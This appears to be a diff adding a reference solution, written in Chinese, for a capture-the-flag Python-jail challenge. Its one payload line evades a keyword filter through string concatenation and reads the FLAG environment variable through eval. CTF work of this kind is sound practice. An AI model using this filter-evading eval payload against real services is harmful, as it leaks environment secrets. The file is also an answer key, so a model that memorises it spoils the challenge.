@@ -1,0 +1,3 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+[v for k, v in locals().items() if v.__name__=='o'+'s'][0].__dict__['envi'+'ron']['F'+'LAG']
